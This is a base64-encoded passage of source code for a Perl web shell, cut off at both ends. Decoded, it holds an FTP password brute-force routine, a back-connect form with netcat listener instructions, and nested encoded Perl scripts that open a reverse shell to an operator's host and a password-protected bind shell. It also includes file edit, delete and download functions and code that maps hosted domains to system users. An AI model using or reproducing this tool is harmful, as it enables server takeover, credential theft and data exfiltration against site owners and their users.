9PT09PT09PT09PT09PT09PT09Pj4+Pj4+Pj4+Pj4+PDw8PDw8PDw8PD09PT09PT09PT09PT09PT09PT09PGJyPjxicj5cbiI7CgkJZm9yZWFjaCAkdXNlcm5hbWUgKEB1c2VyKQoJCXsKCQkJaWYoISgkdXNlcm5hbWUgZXEgIiIpKQoJCQl7CgkJCQlmb3JlYWNoICRwYXNzd29yZCAoQHBhc3MpCgkJCQl7CgkJCQkJJGZ0cCA9IE5ldDo6RlRQLT5uZXcoJFNlcnZlcikgb3IgZGllICJDb3VsZCBub3QgY29ubmVjdCB0byAkU2VydmVyTmFtZVxuIjsgCgkJCQkJaWYoJGZ0cC0+bG9naW4oIiR1c2VybmFtZSIsIiRwYXNzd29yZCIpKQoJCQkJCXsKCQkJCQkJJHJlc3VsdCAuPSAiPGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9J2Z0cDovLyR1c2VybmFtZTokcGFzc3dvcmRcQCRTZXJ2ZXInPlsrXSBmdHA6Ly8kdXNlcm5hbWU6JHBhc3N3b3JkXEAkU2VydmVyPC9hPjxicj5cbiI7CgkJCQkJCSRmdHAtPnF1aXQoKTsKCQkJCQkJYnJlYWs7CgkJCQkJfQoJCQkJCWlmKCEoJGlueydzbGVlcCd9IGVxICIwIikpCgkJCQkJewoJCQkJCQlzbGVlcChpbnQoJGlueydzbGVlcCd9KSk7CgkJCQkJfQoJCQkJCSRmdHAtPnF1aXQoKTsKCQkJCX0KCQkJfQoJCX0KCQkkcmVzdWx0IC49ICJcbjxicj49PT09PT09PT09Pj4+Pj4+Pj4+PiBGaW5pc2hlZCA8PDw8PDw8PDw8PT09PT09PT09PTxicj5cbiI7Cgl9CglyZXR1cm4gJHJlc3VsdDsKfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgQmFja2Nvbm5lY3QgRm9ybQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBCYWNrQmluZEZvcm0KewoJcmV0dXJuIDw8RU5EOwoJPGJyPjxicj4KCgk8dGFibGU+Cgk8dHI+Cgk8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KCTx0ZD5CYWNrQ29ubmVjdDogPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImJhY2tiaW5kIj48L3RkPgoJPHRkPiBIb3N0OiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMjAiIG5hbWU9ImNsaWVudGFkZHIiIHZhbHVlPSIkRU5WeydSRU1PVEVfQUREUid9Ij4KCSBQb3J0OiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNyIgbmFtZT0iY2xpZW50cG9ydCIgdmFsdWU9IjgwIiBvbmtleXVwPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYmEnKS5pbm5lckhUTUw9dGhpcy52YWx1ZTsiPjwvdGQ+CgoJPHRkPjxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkNvbm5lY3QiPjwvdGQ+Cgk8L2Zvcm0+Cgk8L3RyPgoJPHRyPgoJPHRkIGNvbHNwYW49Mz48Zm9udCBjb2xvcj0jRkZGRkZGPlsrXSBDbGllbnQgbGlzdGVuIGJlZm9yZSBjb25uZWN0IGJhY2shCgk8YnI+WytdIFRyeSBjaGVjayB5b3VyIFBvcnQgd2l0aCA8YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iaHR0cDovL3d3dy5jYW55b3VzZWVtZS5vcmcvIj5odHRwOi8vd3d3LmNhbnlvdXNlZW1lLm9yZy88L2E+Cgk8YnI+WytdIENsaWVudCBsaXN0ZW4gd2l0aCBjb21tYW5kOiA8cnVuPm5jIC12diAtbCAtcCA8c3BhbiBpZD0iYmEiPjgwPC9zcGFuPjwvcnVuPjwvZm9udD48L3RkPgoKCTwvdHI+Cgk8L3RhYmxlPgoKCTxicj48YnI+Cgk8dGFibGU+Cgk8dHI+Cgk8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KCTx0ZD5CaW5kIFBvcnQ6IDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJiYWNrYmluZCI+PC90ZD4KCgk8dGQ+IFBvcnQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSIxNSIgbmFtZT0iY2xpZW50cG9ydCIgdmFsdWU9IjE0MTIiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiaScpLmlubmVySFRNTD10aGlzLnZhbHVlOyI+CgoJIFBhc3N3b3JkOiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMTUiIG5hbWU9ImJpbmRwYXNzIiB2YWx1ZT0iVEhJRVVHSUFCVU9OIj48L3RkPgoJPHRkPjxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkJpbmQiPjwvdGQ+Cgk8L2Zvcm0+Cgk8L3RyPgoJPHRyPgoJPHRkIGNvbHNwYW49Mz48Zm9udCBjb2xvcj0jRkZGRkZGPlsrXSBDaHVjIG5hbmcgY2h1YSBkYyB0ZXN0IQoJPGJyPlsrXSBUcnkgY29tbWFuZDogPHJ1bj5uYyAkRU5WeydTRVJWRVJfQUREUid9IDxzcGFuIGlkPSJiaSI+MTQxMjwvc3Bhbj48L3J1bj48L2ZvbnQ+PC90ZD4KCgk8L3RyPgoJPC90YWJsZT48YnI+CkVORAp9CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBCYWNrY29ubmVjdCB1c2UgcGVybAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBCYWNrQmluZAp7Cgl1c2UgTUlNRTo6QmFzZTY0OwoJdXNlIFNvY2tldDsJCgkkYmFja3Blcmw9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFwMWMyVWdTVTg2T2xOdlkydGxkRHNOQ2lSVGFHVnNiQWs5SUNJdlltbHVMMkpoYzJnaU93MEtKRUZTUjBNOVFFRlNSMVk3RFFwMWMyVWdVMjlqYTJWME93MEtkWE5sSUVacGJHVklZVzVrYkdVN0RRcHpiMk5yWlhRb1UwOURTMFZVTENCUVJsOUpUa1ZVTENCVFQwTkxYMU5VVWtWQlRTd2daMlYwY0hKdmRHOWllVzVoYldVb0luUmpjQ0lwS1NCdmNpQmthV1VnY0hKcGJuUWdJbHN0WFNCVmJtRmliR1VnZEc4Z1VtVnpiMngyWlNCSWIzTjBYRzRpT3cwS1kyOXVibVZqZENoVFQwTkxSVlFzSUhOdlkydGhaR1J5WDJsdUtDUkJVa2RXV3pGZExDQnBibVYwWDJGMGIyNG9KRUZTUjFaYk1GMHBLU2tnYjNJZ1pHbGxJSEJ5YVc1MElDSmJMVjBnVlc1aFlteGxJSFJ2SUVOdmJtNWxZM1FnU0c5emRGeHVJanNOQ25CeWFXNTBJQ0pEYjI1dVpXTjBaV1FoSWpzTkNsTlBRMHRGVkMwK1lYVjBiMlpzZFhOb0tDazdEUXB2Y0dWdUtGTlVSRWxPTENBaVBpWlRUME5MUlZRaUtUc05DbTl3Wlc0b1UxUkVUMVZVTENJK0psTlBRMHRGVkNJcE93MEtiM0JsYmloVFZFUkZVbElzSWo0bVUwOURTMFZVSWlrN0RRcHdjbWx1ZENBaUxTMDlQU0JEYjI1dVpXTjBaV1FnUW1GamEyUnZiM0lnUFQwdExTQWdYRzVjYmlJN0RRcHplWE4wWlcwb0luVnVjMlYwSUVoSlUxUkdTVXhGT3lCMWJuTmxkQ0JUUVZaRlNFbFRWQ0E3WldOb2J5QW5XeXRkSUZONWMzUmxiV2x1Wm04NklDYzdJSFZ1WVcxbElDMWhPMlZqYUc4N1pXTm9ieUFuV3l0ZElGVnpaWEpwYm1adk9pQW5PeUJwWkR0bFkyaHZPMlZqYUc4Z0oxc3JYU0JFYVhKbFkzUnZjbms2SUNjN0lIQjNaRHRsWTJodk95QmxZMmh2SUNkYksxMGdVMmhsYkd3NklDYzdKRk5vWld4c0lpazdEUXBqYkc5elpTQlRUME5MUlZRNyI7CgkkYmluZHBlcmw9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFwMWMyVWdVMjlqYTJWME93MEtKRUZTUjBNOVFFRlNSMVk3RFFva2NHOXlkQWs5SUNSQlVrZFdXekJkT3cwS0pIQnliM1J2Q1QwZ1oyVjBjSEp2ZEc5aWVXNWhiV1VvSjNSamNDY3BPdzBLSkZOb1pXeHNDVDBnSWk5aWFXNHZZbUZ6YUNJN0RRcHpiMk5yWlhRb1UwVlNWa1ZTTENCUVJsOUpUa1ZVTENCVFQwTkxYMU5VVWtWQlRTd2dKSEJ5YjNSdktXOXlJR1JwWlNBaWMyOWphMlYwT2lRaElqc05Dbk5sZEhOdlkydHZjSFFvVTBWU1ZrVlNMQ0JUVDB4ZlUwOURTMFZVTENCVFQxOVNSVlZUUlVGRVJGSXNJSEJoWTJzb0ltd2lMQ0F4S1NsdmNpQmthV1VnSW5ObGRITnZZMnR2Y0hRNklDUWhJanNOQ21KcGJtUW9VMFZTVmtWU0xDQnpiMk5yWVdSa2NsOXBiaWdrY0c5eWRDd2dTVTVCUkVSU1gwRk9XU2twYjNJZ1pHbGxJQ0ppYVc1a09pQWtJU0k3RFFwc2FYTjBaVzRvVTBWU1ZrVlNMQ0JUVDAxQldFTlBUazRwQ1FsdmNpQmthV1VnSW14cGMzUmxiam9nSkNFaU93MEtabTl5S0RzZ0pIQmhaR1J5SUQwZ1lXTmpaWEIwS0VOTVNVVk9WQ3dnVTBWU1ZrVlNLVHNnWTJ4dmMyVWdRMHhKUlU1VUtRMEtldzBLQ1c5d1pXNG9VMVJFU1U0c0lDSStKa05NU1VWT1ZDSXBPdzBLQ1c5d1pXNG9VMVJFVDFWVUxDQWlQaVpEVEVsRlRsUWlLVHNOQ2dsdmNHVnVLRk5VUkVWU1Vpd2dJajRtUTB4SlJVNVVJaWs3RFFvSmMzbHpkR1Z0S0NKMWJuTmxkQ0JJU1ZOVVJrbE1SVHNnZFc1elpYUWdVMEZXUlVoSlUxUWdPMlZqYUc4Z0oxc3JYU0JUZVhOMFpXMXBibVp2T2lBbk95QjFibUZ0WlNBdFlUdGxZMmh2TzJWamFHOGdKMXNyWFNCVmMyVnlhVzVtYnpvZ0p6c2dhV1E3WldOb2J6dGxZMmh2SUNkYksxMGdSR2x5WldOMGIzSjVPaUFuT3lCd2QyUTdaV05vYnpzZ1pXTm9ieUFuV3l0ZElGTm9aV3hzT2lBbk95UlRhR1ZzYkNJcE93MEtDV05zYjNObEtGTlVSRWxPS1RzTkNnbGpiRzl6WlNoVFZFUlBWVlFwT3cwS0NXTnNiM05sS0ZOVVJFVlNVaWs3RFFwOURRbz0iOwoKCSRDbGllbnRBZGRyID0gJGlueydjbGllbnRhZGRyJ307CgkkQ2xpZW50UG9ydCA9IGludCgkaW57J2NsaWVudHBvcnQnfSk7CglpZigkQ2xpZW50UG9ydCBlcSAwKQoJewoJCXJldHVybiAmQmFja0JpbmRGb3JtOwoJfWVsc2lmKCEkQ2xpZW50QWRkciBlcSAiIikKCXsKCQkkRGF0YT1kZWNvZGVfYmFzZTY0KCRiYWNrcGVybCk7CgkJaWYoLXcgIi90bXAvIikKCQl7CgkJCSRGaWxlPSIvdG1wL2JhY2tjb25uZWN0LnBsIjsJCgkJfWVsc2UKCQl7CgkJCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiJiYWNrY29ubmVjdC5wbCI7CgkJfQoJCW9wZW4oRklMRSwgIj4kRmlsZSIpOwoJCXByaW50IEZJTEUgJERhdGE7CgkJY2xvc2UgRklMRTsKCQlzeXN0ZW0oInBlcmwgYmFja2Nvbm5lY3QucGwgJENsaWVudEFkZHIgJENsaWVudFBvcnQiKTsKCQl1bmxpbmsoJEZpbGUpOwoJCWV4aXQgMDsKCX1lbHNlCgl7CgkJJERhdGE9ZGVjb2RlX2Jhc2U2NCgkYmluZHBlcmwpOwoJCWlmKC13ICIvdG1wIikKCQl7CgkJCSRGaWxlPSIvdG1wL2JpbmRwb3J0LnBsIjsJCgkJfWVsc2UKCQl7CgkJCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiJiaW5kcG9ydC5wbCI7CgkJfQoJCW9wZW4oRklMRSwgIj4kRmlsZSIpOwoJCXByaW50IEZJTEUgJERhdGE7CgkJY2xvc2UgRklMRTsKCQlzeXN0ZW0oInBlcmwgYmluZHBvcnQucGwgJENsaWVudFBvcnQiKTsKCQl1bmxpbmsoJEZpbGUpOwoJCWV4aXQgMDsKCX0KfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgIEFycmF5IExpc3QgRGlyZWN0b3J5CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFJtRGlyKCQpIAp7CglteSAkZGlyID0gc2hpZnQ7CiAgICBpZihvcGVuZGlyKERJUiwkZGlyKSkKCXsKCQl3aGlsZSgkZmlsZSA9IHJlYWRkaXIoRElSKSkKCQl7CgkJCWlmKCgkZmlsZSBuZSAiLiIpICYmICgkZmlsZSBuZSAiLi4iKSkKCQkJewoJCQkJJGZpbGU9ICRkaXIuJFBhdGhTZXAuJGZpbGU7CgkJCQlpZigtZCAkZmlsZSkKCQkJCXsKCQkJCQkmUm1EaXIoJGZpbGUpOwoJCQkJfQoJCQkJZWxzZQoJCQkJewoJCQkJCXVubGluaygkZmlsZSk7CgkJCQl9CgkJCX0KCQl9CgkJY2xvc2VkaXIoRElSKTsKCX0KCWlmKCFybWRpcigkZGlyKSkKCXsKCQkKCX0KfQpzdWIgRmlsZU93bmVyKCQpCnsKCW15ICRmaWxlID0gc2hpZnQ7CglpZigtZSAkZmlsZSkKCXsKCQkoJHVpZCwkZ2lkKSA9IChzdGF0KCRmaWxlKSlbNCw1XTsKCQlpZigkV2luTlQpCgkJewoJCQlyZXR1cm4gIj8/PyI7CgkJfQoJCWVsc2UKCQl7CgkJCSRuYW1lPWdldHB3dWlkKCR1aWQpOwoJCQkkZ3JvdXA9Z2V0Z3JnaWQoJGdpZCk7CgkJCXJldHVybiAkbmFtZS4iLyIuJGdyb3VwOwoJCX0KCX0KCXJldHVybiAiPz8/IjsKfQpzdWIgUGFyZW50Rm9sZGVyKCQpCnsKCW15ICRwYXRoID0gc2hpZnQ7CglteSAkQ29tbSA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkIC4uIi4kQ21kU2VwLiRDbWRQd2Q7CgljaG9wKCRwYXRoID0gYCRDb21tYCk7CglyZXR1cm4gJHBhdGg7Cn0Kc3ViIEZpbGVQZXJtcygkKQp7CglteSAkZmlsZSA9IHNoaWZ0OwoJbXkgJHVyID0gIi0iOwoJbXkgJHV3ID0gIi0iOwoJaWYoLWUgJGZpbGUpCgl7CgkJaWYoJFdpbk5UKQoJCXsKCQkJaWYoLXIgJGZpbGUpeyAkdXIgPSAiciI7IH0KCQkJaWYoLXcgJGZpbGUpeyAkdXcgPSAidyI7IH0KCQkJcmV0dXJuICR1ciAuICIgLyAiIC4gJHV3OwoJCX1lbHNlCgkJewoJCQkkbW9kZT0oc3RhdCgkZmlsZSkpWzJdOwoJCQkkcmVzdWx0ID0gc3ByaW50ZigiJTA0byIsICRtb2RlICYgMDc3NzcpOwoJCQlyZXR1cm4gJHJlc3VsdDsKCQl9Cgl9CglyZXR1cm4gIjAwMDAiOwp9CnN1YiBGaWxlTGFzdE1vZGlmaWVkKCQpCnsKCW15ICRmaWxlID0gc2hpZnQ7CglpZigtZSAkZmlsZSkKCXsKCQkoJGxhKSA9IChzdGF0KCRmaWxlKSlbOV07CgkJKCRkLCRtLCR5LCRoLCRpKSA9IChsb2NhbHRpbWUoJGxhKSlbMyw0LDUsMiwxXTsKCQkkeSA9ICR5ICsgMTkwMDsKCQlAbW9udGggPSBxdy8xIDIgMyA0IDUgNiA3IDggOSAxMCAxMSAxMi87CgkJJGxtdGltZSA9IHNwcmludGYoIiUwMmQvJXMvJTRkICUwMmQ6JTAyZCIsJGQsJG1vbnRoWyRtXSwkeSwkaCwkaSk7CgkJcmV0dXJuICRsbXRpbWU7Cgl9CglyZXR1cm4gIj8/PyI7Cn0Kc3ViIEZpbGVTaXplKCQpCnsKCW15ICRmaWxlID0gc2hpZnQ7CglpZigtZiAkZmlsZSkKCXsKCQlyZXR1cm4gLXMgJGZpbGU7Cgl9CglyZXR1cm4gIjAiOwoKfQpzdWIgUGFyc2VGaWxlU2l6ZSgkKQp7CglteSAkc2l6ZSA9IHNoaWZ0OwoJaWYoJHNpemUgPD0gMTAyNCkKCXsKCQlyZXR1cm4gJHNpemUuICIgQiI7Cgl9CgllbHNlCgl7CgkJaWYoJHNpemUgPD0gMTAyNCoxMDI0KSAKCQl7CgkJCSRzaXplID0gc3ByaW50ZigiJS4wMmYiLCRzaXplIC8gMTAyNCk7CgkJCXJldHVybiAkc2l6ZS4iIEtCIjsKCQl9CgkJZWxzZSAKCQl7CgkJCSRzaXplID0gc3ByaW50ZigiJS4yZiIsJHNpemUgLyAxMDI0IC8gMTAyNCk7CgkJCXJldHVybiAkc2l6ZS4iIE1CIjsKCQl9Cgl9Cn0Kc3ViIHRyaW0oJCkKewoJbXkgJHN0cmluZyA9IHNoaWZ0OwoJJHN0cmluZyA9fiBzL15ccysvLzsKCSRzdHJpbmcgPX4gcy9ccyskLy87CglyZXR1cm4gJHN0cmluZzsKfQpzdWIgQWRkU2xhc2hlcygkKQp7CglteSAkc3RyaW5nID0gc2hpZnQ7Cgkkc3RyaW5nPX4gcy9cXC9cXFxcL2c7CglyZXR1cm4gJHN0cmluZzsKfQpzdWIgTGlzdERpcgp7CglteSAkcGF0aCA9ICRDdXJyZW50RGlyLiRQYXRoU2VwOwoJJHBhdGg9fiBzL1xcXFwvXFwvZzsKCW15ICRyZXN1bHQgPSAiPGZvcm0gbmFtZT0nZicgYWN0aW9uPSckU2NyaXB0TG9jYXRpb24nPjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+UGF0aDogWyAiLiZBZGRMaW5rRGlyKCJndWkiKS4iIF0gPC9zcGFuPjxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSdkJyBzaXplPSc0MCcgdmFsdWU9JyRDdXJyZW50RGlyJyAvPjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2EnIHZhbHVlPSdndWknPjxpbnB1dCBjbGFzcz0nc3VibWl0JyB0eXBlPSdzdWJtaXQnIHZhbHVlPSdDaGFuZ2UnPjwvZm9ybT4iOwoJaWYoLWQgJHBhdGgpCgl7CgkJbXkgQGZuYW1lID0gKCk7CgkJbXkgQGRuYW1lID0gKCk7CgkJaWYob3BlbmRpcihESVIsJHBhdGgpKQoJCXsKCQkJd2hpbGUoJGZpbGUgPSByZWFkZGlyKERJUikpCgkJCXsKCQkJCSRmPSRwYXRoLiRmaWxlOwoJCQkJaWYoLWQgJGYpCgkJCQl7CgkJCQkJcHVzaChAZG5hbWUsJGZpbGUpOwoJCQkJfQoJCQkJZWxzZQoJCQkJewoJCQkJCXB1c2goQGZuYW1lLCRmaWxlKTsKCQkJCX0KCQkJfQoJCQljbG9zZWRpcihESVIpOwoJCX0KCQlAZm5hbWUgPSBzb3J0IHsgbGMoJGEpIGNtcCBsYygkYikgfSBAZm5hbWU7CgkJQGRuYW1lID0gc29ydCB7IGxjKCRhKSBjbXAgbGMoJGIpIH0gQGRuYW1lOwoJCSRyZXN1bHQgLj0gIjxkaXY+PHRhYmxlIHdpZHRoPSc5MCUnIGNsYXNzPSdsaXN0ZGlyJz4KCgkJPHRyIHN0eWxlPSdiYWNrZ3JvdW5kLWNvbG9yOiAjM2UzZTNlJz48dGg+RmlsZSBOYW1lPC90aD4KCQk8dGggc3R5bGU9J3dpZHRoOjEwMHB4Oyc+RmlsZSBTaXplPC90aD4KCQk8dGggc3R5bGU9J3dpZHRoOjE1MHB4Oyc+T3duZXI8L3RoPgoJCTx0aCBzdHlsZT0nd2lkdGg6MTAwcHg7Jz5QZXJtaXNzaW9uPC90aD4KCQk8dGggc3R5bGU9J3dpZHRoOjE1MHB4Oyc+TGFzdCBNb2RpZmllZDwvdGg+CgkJPHRoIHN0eWxlPSd3aWR0aDoyNjBweDsnPkFjdGlvbjwvdGg+PC90cj4iOwoJCW15ICRzdHlsZT0ibGluZSI7CgkJbXkgJGk9MDsKCQlmb3JlYWNoIG15ICRkIChAZG5hbWUpCgkJewoJCQkkc3R5bGU9ICgkc3R5bGUgZXEgImxpbmUiKSA/ICJub3RsaW5lIjogImxpbmUiOwoJCQkkZCA9ICZ0cmltKCRkKTsKCQkJJGRpcm5hbWU9JGQ7CgkJCWlmKCRkIGVxICIuLiIpIAoJCQl7CgkJCQkkZCA9ICZQYXJlbnRGb2xkZXIoJHBhdGgpOwoJCQl9CgkJCWVsc2lmKCRkIGVxICIuIikgCgkJCXsKCQkJCSRkID0gJHBhdGg7CgkJCX0KCQkJZWxzZSAKCQkJewoJCQkJJGQgPSAkcGF0aC4kZDsKCQkJfQoJCQkkcmVzdWx0IC49ICI8dHIgY2xhc3M9JyRzdHlsZSc+CgoJCQk8dGQgaWQ9J0ZpbGVfJGknIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+PGEgIGhyZWY9Jz9hPWd1aSZkPSIuJGQuIic+WyAiLiRkaXJuYW1lLiIgXTwvYT48L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZD5ESVI8L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlT3duZXIoJGQpLiI8L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZCBpZD0nRmlsZVBlcm1zXyRpJyBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7JyBvbmRibGNsaWNrPVwicm1fY2htb2RfZm9ybSh0aGlzLCIuJGkuIiwnIi4mRmlsZVBlcm1zKCRkKS4iJywnIi4kZGlybmFtZS4iJylcIiA+PHNwYW4gb25jbGljaz1cImNobW9kX2Zvcm0oIi4kaS4iLCciLiRkaXJuYW1lLiInKVwiID4iLiZGaWxlUGVybXMoJGQpLiI8L3NwYW4+PC90ZD4iOwoJCQkkcmVzdWx0IC49ICI8dGQgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOyc+Ii4mRmlsZUxhc3RNb2RpZmllZCgkZCkuIjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPjxhIGhyZWY9J2phdmFzY3JpcHQ6cmV0dXJuIGZhbHNlOycgb25jbGljaz1cInJlbmFtZV9mb3JtKCRpLCckZGlybmFtZScsJyIuJkFkZFNsYXNoZXMoJkFkZFNsYXNoZXMoJGQpKS4iJylcIj5SZW5hbWU8L2E+ICB8IDxhIG9uY2xpY2s9XCJpZighY29uZmlybSgnUmVtb3ZlIGRpcjogJGRpcm5hbWUgPycpKSB7IHJldHVybiBmYWxzZTt9XCIgaHJlZj0nP2E9Z3VpJmQ9JHBhdGgmcmVtb3ZlPSRkaXJuYW1lJz5SZW1vdmU8L2E+PC90ZD4iOwoJCQkkcmVzdWx0IC49ICI8L3RyPiI7CgkJCSRpKys7CgkJfQoJCWZvcmVhY2ggbXkgJGYgKEBmbmFtZSkKCQl7CgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7CgkJCSRmaWxlPSRmOwoJCQkkZiA9ICRwYXRoLiRmOwoJCQkkdmlldyA9ICI/ZGlyPSIuJHBhdGguIiZ2aWV3PSIuJGY7CgkJCSRyZXN1bHQgLj0gIjx0ciBjbGFzcz0nJHN0eWxlJz48dGQgaWQ9J0ZpbGVfJGknIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7Jz48YSBocmVmPSc/YT1jb21tYW5kJmQ9Ii4kcGF0aC4iJmM9ZWRpdCUyMCIuJGZpbGUuIic+Ii4kZmlsZS4iPC9hPjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkPiIuJlBhcnNlRmlsZVNpemUoJkZpbGVTaXplKCRmKSkuIjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPiIuJkZpbGVPd25lcigkZikuIjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkIGlkPSdGaWxlUGVybXNfJGknIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnIG9uZGJsY2xpY2s9XCJybV9jaG1vZF9mb3JtKHRoaXMsIi4kaS4iLCciLiZGaWxlUGVybXMoJGYpLiInLCciLiRmaWxlLiInKVwiID48c3BhbiBvbmNsaWNrPVwiY2htb2RfZm9ybSgkaSwnJGZpbGUnKVwiID4iLiZGaWxlUGVybXMoJGYpLiI8L3NwYW4+PC90ZD4iOwoJCQkkcmVzdWx0IC49ICI8dGQgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOyc+Ii4mRmlsZUxhc3RNb2RpZmllZCgkZikuIjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPjxhIGhyZWY9Jz9hPWNvbW1hbmQmZD0iLiRwYXRoLiImYz1lZGl0JTIwIi4kZmlsZS4iJz5FZGl0PC9hPiB8IDxhIGhyZWY9J2phdmFzY3JpcHQ6cmV0dXJuIGZhbHNlOycgb25jbGljaz1cInJlbmFtZV9mb3JtKCRpLCckZmlsZScsJ2YnKVwiPlJlbmFtZTwvYT4gfCA8YSBocmVmPSc/YT1kb3dubG9hZCZvPWdvJmY9Ii4kZi4iJz5Eb3dubG9hZDwvYT4gfCA8YSBvbmNsaWNrPVwiaWYoIWNvbmZpcm0oJ1JlbW92ZSBmaWxlOiAkZmlsZSA/JykpIHsgcmV0dXJuIGZhbHNlO31cIiBocmVmPSc/YT1ndWkmZD0kcGF0aCZyZW1vdmU9JGZpbGUnPlJlbW92ZTwvYT48L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjwvdHI+IjsKCQkJJGkrKzsKCQl9CgkJJHJlc3VsdCAuPSAiPC90YWJsZT48L2Rpdj4iOwoJfQoJcmV0dXJuICRyZXN1bHQ7Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRyeSB0byBWaWV3IExpc3QgVXNlcgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBWaWV3RG9tYWluVXNlcgp7CglvcGVuIChkb21haW5zLCAnL2V0Yy9uYW1lZC5jb25mJykgb3IgJGVycj0xOwoJbXkgQGNuenMgPSA8ZG9tYWlucz47CgljbG9zZSBkMG1haW5zOwoJbXkgJHN0eWxlPSJsaW5lIjsKCW15ICRyZXN1bHQ9IjxoNT48Zm9udCBzdHlsZT0nZm9udDogMTVwdCBWZXJkYW5hO2NvbG9yOiAjZmY5OTAwOyc+SG9hbmcgU2EgLSBUcnVvbmcgU2E8L2ZvbnQ+PC9oNT4iOwoJaWYgKCRlcnIpCgl7CgkJJHJlc3VsdCAuPSAgKCc8cD5DMHVsZG5cJ3QgQnlwYXNzIGl0ICwgU29ycnk8L3A+Jyk7CgkJcmV0dXJuICRyZXN1bHQ7Cgl9ZWxzZQoJewoJCSRyZXN1bHQgLj0gJzx0YWJsZT48dHI+PHRoPkRvbWFpbnM8L3RoPiA8dGg+VXNlcjwvdGg+PC90cj4nOwoJfQoJZm9yZWFjaCBteSAkb25lIChAY256cykKCXsKCQlpZigkb25lID1+IG0vLio/em9uZSAiKC4qPykiIHsvKQoJCXsJCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7CgkJCSRmaWxlbmFtZT0gIi9ldGMvdmFsaWFzZXMvIi4kb25lOwoJCQkkb3duZXIgPSBnZXRwd3VpZCgoc3RhdCgkZmlsZW5hbWUpKVs0XSk7CgkJCSRyZXN1bHQgLj0gJzx0ci